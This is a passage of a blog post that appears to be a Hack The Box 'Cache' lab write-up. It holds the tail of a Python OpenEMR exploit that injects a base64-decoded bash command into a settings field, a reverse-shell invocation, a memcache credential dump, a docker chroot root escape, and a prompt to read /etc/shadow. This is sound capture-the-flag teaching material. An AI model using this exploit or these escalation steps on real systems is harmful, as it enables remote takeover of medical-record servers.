    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"0&amp;form_59=3&amp;form_60=6%2C0&amp;form_61=0&amp;form_62=0&amp;form_63=_blank&amp;form_69=1&amp;fo"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"rm_70=1&amp;form_77=1&amp;form_79=&amp;form_80=&amp;form_81=&amp;form_84=1&amp;form_85=1&amp;form_87="</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"1&amp;form_89=1&amp;form_90=1&amp;form_91=1&amp;form_92=Y1&amp;form_93=1&amp;form_94=2&amp;form_95=0&amp;"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"form_97=14&amp;form_98=11&amp;form_99=24&amp;form_100=20&amp;form_102=1&amp;form_103=0&amp;form_1"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"04=0&amp;form_105=ICD10&amp;form_106=1&amp;form_107=1&amp;form_112=3&amp;form_115=1&amp;form_116="</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"&amp;form_119=1.00&amp;form_121=0&amp;form_123=&amp;form_125=30&amp;form_126=&amp;form_127=60&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_128=&amp;form_129=90&amp;form_130=&amp;form_131=120&amp;form_132=&amp;form_133=150&amp;form_134"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"=&amp;form_135=1&amp;form_138=1&amp;form_139=1&amp;form_141=1&amp;form_142=0&amp;form_143=localho"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"st&amp;form_144=&amp;form_145=&amp;form_146=5984&amp;form_147=&amp;form_150=Patient+ID+card&amp;f"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"orm_151=Patient+Photograph&amp;form_152=Lab+Report&amp;form_153=Lab+Report&amp;form_1"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"55=100&amp;form_157=8&amp;form_158=17&amp;form_159=15&amp;form_160=day&amp;form_161=1&amp;form_16"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"2=2&amp;form_163=1&amp;form_164=10&amp;form_165=10&amp;form_166=15&amp;form_167=20&amp;form_168=1"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"&amp;form_169=%23FFFFFF&amp;form_170=%23E6E6FF&amp;form_171=%23E6FFE6&amp;form_172=%23FFE"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"6FF&amp;form_173=1&amp;form_174=0&amp;form_176=1&amp;form_177=1&amp;form_178=1&amp;form_181=1&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_182=1&amp;form_183=1&amp;form_184=1&amp;form_185=D0&amp;form_186=D0&amp;form_187=0%3A20&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_188=0&amp;form_190=33&amp;form_191=0&amp;form_194=7200&amp;form_198=1&amp;form_199=0&amp;form_2"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"00=0&amp;form_202=&amp;form_203=&amp;form_204=365&amp;form_205=&amp;form_206=1&amp;form_208=&amp;form"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"_210=&amp;form_211=&amp;form_212=&amp;form_213=&amp;form_214=&amp;form_215=&amp;form_216=SMTP&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_217=localhost&amp;form_218=25&amp;form_219=&amp;form_220=&amp;form_221=&amp;form_222=50&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_223=50&amp;form_224=&amp;form_225=&amp;form_226=&amp;form_227=50&amp;form_228=&amp;form_229=&amp;fo"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"rm_230=&amp;form_231=1&amp;form_232=1&amp;form_233=1&amp;form_234=1&amp;form_235=1&amp;form_236=1"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"&amp;form_237=1&amp;form_238=1&amp;form_239=Model+Registry&amp;form_240=125789123&amp;form_24"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"1=1&amp;form_242=1&amp;form_243=1&amp;form_244=&amp;form_245=&amp;form_246=1&amp;form_247=1&amp;form_"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"248=1&amp;form_249=5&amp;form_250=1&amp;form_252=1&amp;form_253=1&amp;form_254=1&amp;form_255=1&amp;f"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"orm_256=1&amp;form_257=1&amp;form_258=1&amp;form_262=&amp;form_263=6514&amp;form_264=&amp;form_26"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"5=&amp;form_267=1&amp;form_268=0&amp;form_269=%2Fusr%2Fbin&amp;form_270=%2Fusr%2Fbin&amp;form"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"_271=%2Ftmp&amp;form_272=%2Ftmp&amp;form_273=26&amp;form_274=state&amp;form_275=1&amp;form_27"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"6=26&amp;form_277=country&amp;form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"+-o+page-left%3D72+-o+page-top%3D72&amp;form_279=&amp;form_280=&amp;form_282=2018-07-"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"23&amp;form_283=1&amp;form_285=%2Fvar%2Fspool%2Fhylafax&amp;form_286=enscript+-M+Lett"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&amp;form_288=%2Fmnt%2Fscan_docs&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&amp;form_292=1&amp;form_"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&amp;form_297=1&amp;form_"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"299=&amp;form_300=&amp;form_301=&amp;form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"ovider.php&amp;form_303=https%3A%2F%2Fssh.mydocsportal.com&amp;form_305=https%3A%"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"2F%2Fyour_cms_site.com%2F&amp;form_306=&amp;form_307=&amp;form_308=0&amp;form_309=https%3"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&amp;form_312=https%3A%2F%2Fsecure.newcrop"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"accounts.com%2FInterfaceV7%2FRxEntry.aspx&amp;form_313=https%3A%2F%2Fsecure.n"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&amp;fo"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"rm_314=21600&amp;form_315=21600&amp;form_316=&amp;form_317=&amp;form_318=&amp;form_319=1&amp;form"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"_324=&amp;form_325=0&amp;form_327=137&amp;form_328=7C84773D5063B20BC9E41636A091C6F17E"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"9C1E34&amp;form_329=C36275&amp;form_330=0&amp;form_332=https%3A%2F%2Fphimail.example."</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"com%3A32541&amp;form_333=&amp;form_334=&amp;form_335=admin&amp;form_336=5&amp;form_339=1&amp;form"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"_346=LETTER&amp;form_347=30&amp;form_348=30&amp;form_349=72&amp;form_350=30&amp;form_351=P&amp;fo"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"rm_352=en&amp;form_353=LETTER&amp;form_354=5&amp;form_355=5&amp;form_356=5&amp;form_357=8&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_358=D&amp;form_359=1&amp;form_360=9&amp;form_361=1&amp;form_362=104.775&amp;form_363=241.3&amp;"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"form_364=14&amp;form_365=65&amp;form_366=220"</span>

    <span class="n">p</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"&amp;"</span><span class="p">,</span> <span class="s">"</span><span class="si">\</span><span class="se">n</span><span class="s">"</span><span class="p">).</span><span class="n">splitlines</span><span class="p">():</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]})</span>
   
    <span class="c1"># Linux only, but can be easily modified for Windows.
</span>    <span class="n">_cmd</span> <span class="o">=</span> <span class="s">"|| echo "</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="s">"|base64 -d|bash"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="s">"form_284"</span><span class="p">:</span> <span class="n">_cmd</span><span class="p">})</span>
    
    <span class="k">print</span><span class="p">(</span><span class="n">load</span> <span class="o">+</span> <span class="s">"Injecting payload"</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">host</span> <span class="o">+</span> <span class="s">"/interface/super/edit_globals.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
    <span class="n">sp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">host</span> <span class="o">+</span> <span class="s">"/interface/main/daemon_frame.php"</span><span class="p">)</span> <span class="c1"># M4tt D4em0n w0z h3r3 ;PpPpp
</span>    <span class="k">if</span> <span class="n">sp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">load</span> <span class="o">+</span> <span class="s">"Payload executed"</span><span class="p">)</span>
</pre></table></code></div></div><p>run it as below:</p><p><code class="highlighter-rouge">python rce.py http://hms.htb -u openemr_admin -p xxxxxx -c "$(revsh | grep 'bash -i')"</code></p><p><strong><em>NOTE: **revsh** is my script to get right command for reverse shell with ip and port defined</em></strong></p><p>Got connection back!</p><p><img src="/img/Cache/2020-05-14-00-21-41.png" alt="" /></p><h2 id="privesc">Privesc</h2><h3 id="user-enum">user enum</h3><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /home
<span class="go">ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Sep 17  2019 .
drwxr-xr-x 23 root  root  4096 May  5 11:14 ..
drwxr-xr-x 11 ash   ash   4096 May  6 08:50 ash
drwxr-x---  5 luffy luffy 4096 May  6 08:50 luffy
</span><span class="gp">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><span class="w">
</span></pre></table></code></div></div><p>verify with /etc/passwd</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">www-data@cache:/home$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
<span class="go">cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
</span><span class="gp">www-data@cache:/home$</span><span class="w"> 
</span></pre></table></code></div></div><p>ash was a valid user in this machine.</p><h3 id="su-ash">su ash</h3><p>ash as the same name found on the cache site, I tried to login with su.</p><p>su ash with pass <code class="highlighter-rouge">H@v3_fun</code></p><p><img src="/img/Cache/2020-05-14-00-27-14.png" alt="" /></p><p>Logged in as ash!!</p><h3 id="binary-enum">Binary enum</h3><p>Run my enum script, and search for binary run by root, saw docker program</p><p><img src="/img/Cache/2020-05-14-00-34-17.png" alt="" /></p><p>Tried run docker by ash, got permission denied. Ash didn’t have permission to run docker, someone else does.</p><p><img src="/img/Cache/2020-05-14-00-34-52.png" alt="" /></p><h3 id="memcache">Memcache</h3><p>In the same enum file, I saw memcache also run in this machine.</p><p><img src="/img/Cache/2020-05-14-00-36-56.png" alt="" /></p><p>verify it, and got the port it listen.</p><p><img src="/img/Cache/2020-05-14-00-37-35.png" alt="" /></p><p><img src="/img/Cache/2020-05-14-00-38-45.png" alt="" /></p><h3 id="telnet">Telnet</h3><p>Follow this <a href="https://lzone.de/cheat-sheet/memcached">document</a>, I was able to extract the exact info needed.</p><p>Run telnet to communicate with memcache</p><p><img src="/img/Cache/2020-05-14-00-40-00.png" alt="" /></p><p>Run cachedump command to list the items</p><p><img src="/img/Cache/2020-05-14-00-40-28.png" alt="" /></p><p>With that list, with get command, I manage to get luffy passwd, <code class="highlighter-rouge">0n3_p1ec3</code></p><p><img src="/img/Cache/2020-05-14-00-42-12.png" alt="" /></p><h3 id="su-luffy">su luffy</h3><p>su luffy with <code class="highlighter-rouge">0n3_p1ec3</code>, I’m luffy now!!</p><p><img src="/img/Cache/2020-05-14-00-43-09.png" alt="" /></p><h3 id="docker">docker</h3><p>Now with luffy account, try to run docker again, worked.</p><p><img src="/img/Cache/2020-05-14-00-43-38.png" alt="" /></p><p>The next step, pretty straight forward.</p><p>From GTFO bins, I can get root shell from docker service.</p><p><img src="/img/Cache/2020-05-14-00-44-32.png" alt="" /></p><h2 id="victory">Victory</h2><p>Run below command, I managed to spawn root shell:</p><p><code class="highlighter-rouge">docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash</code></p><p><img src="/img/Cache/2020-05-14-00-46-02.png" alt="" /></p><p><img src="/img/Cache/2020-05-14-00-46-57.png" alt="" /></p><table><thead><tr><th>priv<th>flag<tbody><tr><td>user<td>5f0c29a116aecd1248ebd16301fb167e<tr><td>root<td>8b4153ff21a04367cc987a5c4e23281b</table></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/machine/'>machine</a>, <a href='/categories/writeup/'>writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB Cache Writeup - zRyuki&url=https://zeroryuki.github.io/posts/cache/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB Cache Writeup - zRyuki&u=https://zeroryuki.github.io/posts/cache/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB Cache Writeup - zRyuki&url=https://zeroryuki.github.io/posts/cache/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/zeroryuki/ © 2020 zRyuki MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/obscurity/" class="btn btn-outline-primary"><p>HTB Obscurity Writeup</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT License --><div id="disqus_thread" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> /* * * CONFIGURATION VARIABLES * * */ var disqus_shortname = "zryuki-space"; var disqus_identifier = "/posts/cache"; var disqus_url = "https://zeroryuki.github.io/posts/cache/"; if (document.getElementById('disqus_thread')) { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); } </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Registry/"><div class="card-body"> <span class="timeago small"> Apr 5, 2020 <i class="unloaded">2020-04-05T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Registry</h3><div class="text-muted small"><p>Information Gathering Nmap We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ...</p></div></div></a></div><div class="card"> <a href="/posts/Traverxec/"><div class="card-body"> <span class="timeago small"> Apr 9, 2020 <i class="unloaded">2020-04-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Traverxec</h3><div class="text-muted small"><p>Information Gathering As usual, i start my recon with nmap. Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80SVN scan initiated Thu Dec 5 21:18:15 2019 as: nm...</p></div></div></a></div><div class="card"> <a href="/posts/mango/"><div class="card-body"> <span class="timeago small"> Apr 17, 2020 <i class="unloaded">2020-04-17T21:34:29+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Mango</h3><div class="text-muted small"><p>Info Gathering Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 6...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">zRyuki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zeroryuki.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script><div class="modal fade" id="howModal" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;"><div class="modal-dialog"><div class="modal-content"><div class="modal-header text-center"><div class="row"><div class="col-lg-12"> <img src="/img/Cache/icon.png" style="height: 40px"><h4 data-toc-skip class="modal-title">CACHE</h4><small>This is an active Linux machine. You will need root's shadow hash to read the content</small><br></div></div></div><div class="modal-body"><div class="row"><div class="col-lg-12"><h4 data-toc-skip>How to unlock</h4><span class="subscriptionInfo"><p><i class="fas fa-hashtag"></i> Get machine's root Shadow<br> <code class="highlighter-rouge"><small>cat /etc/shadow | grep root</small></code></p><p><i class="fas fa-hashtag"></i> Hash<br> <code class="highlighter-rouge"><small>echo "{shadow value}" | md5sum</small></code></p><p><i class="fas fa-sign-in-alt"></i> Add hash below</p></span><div class="row"><div class="col-lg-8"> <input type="text" placeholder="Insert hash here.." value="" name="key" id="key" class="form-control"></div><div class="col-lg-4"> <span role="button" tabindex="0"> <button id="decrypt" tabindex="-1" type="submit" class="decrypt-btn" style="background-color: rgb(154, 204, 20); border-color: rgb(154, 204, 20); color: white;"> Decrypt </button> </span></div></div></div><div class="col-lg-12 text-center m-t-md" id="recurlyBalanceControlPanel"> You have <span class="text-warning">-</span> remaining attempt</div></div></div><div class="modal-footer"> <button type="button" class="btn btn-default" data-dismiss="modal"><i class="far fa-times"></i></button></div></div></div></div>
